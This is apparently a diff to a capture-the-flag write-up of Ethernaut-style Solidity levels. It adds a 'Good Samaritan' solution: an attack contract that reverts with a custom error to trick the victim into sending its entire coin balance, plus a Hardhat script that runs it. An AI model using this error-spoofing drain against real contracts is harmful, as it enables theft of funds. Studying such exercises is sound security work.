@@ -1123,7 +1123,7 @@ contract DetectionBot {
 const hre = require("hardhat");
 
 async function main() {
-  const doubleEntryPoint = (await hre.ethers.getContractFactory("DoubleEntryPoint")).attach("0xDA0783B7eb9c9d3cD179B1c425908a21086117E6");
+  const doubleEntryPoint = (await hre.ethers.getContractFactory("DoubleEntryPoint")).attach("<target contract address>");
   const cryptoVault = (await hre.ethers.getContractFactory("CryptoVault")).attach(await doubleEntryPoint.cryptoVault());
   const legacyToken = (await hre.ethers.getContractFactory("LegacyToken")).attach(await doubleEntryPoint.delegatedFrom());
 
@@ -1151,3 +1151,60 @@ main().catch((error) => {
 });
 ```
 
+## 27 Good Samaritan
+
+- Change the GoodSamaritan.sol import to be `@openzeppelin/contracts/utils/Address.sol`
+- Run `npm install @openzeppelin/contracts`
+
+```sol
+pragma solidity ^0.8.0;
+
+import "./GoodSamaritan.sol";
+
+contract GoodSamaritanAttack {
+  GoodSamaritan goodSamaritan;
+  Coin coin;
+
+  error NotEnoughBalance();
+
+  constructor(GoodSamaritan _goodSamaritan, Coin _coin) {
+    goodSamaritan = _goodSamaritan;
+    coin = _coin;
+  }
+
+  function attack() external {
+    goodSamaritan.requestDonation();
+  }
+
+  function notify(uint256 amount) external {
+    // Only the notify() from the wallet.donate10() should revert
+    // (the notify() from the wallet.transferRemainer() should not)
+    if (coin.balances(address(this)) == 10)
+      revert NotEnoughBalance();
+  }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const goodSamaritan = (await hre.ethers.getContractFactory("GoodSamaritan")).attach("<target contract address>");
+  const wallet = (await hre.ethers.getContractFactory("Wallet")).attach(await goodSamaritan.wallet());
+  const coin = (await hre.ethers.getContractFactory("Coin")).attach(await goodSamaritan.coin());
+  console.log(`Coin.balances(Wallet) = ${await coin.balances(await wallet.getAddress())}`);
+
+  const goodSamaritanAttack = await hre.ethers.deployContract("GoodSamaritanAttack", [await goodSamaritan.getAddress(), await coin.getAddress()]);
+  await goodSamaritanAttack.waitForDeployment();
+  (await goodSamaritanAttack.attack()).wait();
+  console.log("Attack complete");
+
+  console.log(`Coin.balances(Wallet) = ${await coin.balances(await wallet.getAddress())}`);
+  console.log(`Coin.balances(GoodSamaritanAttack) = ${await coin.balances(await goodSamaritanAttack.getAddress())}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
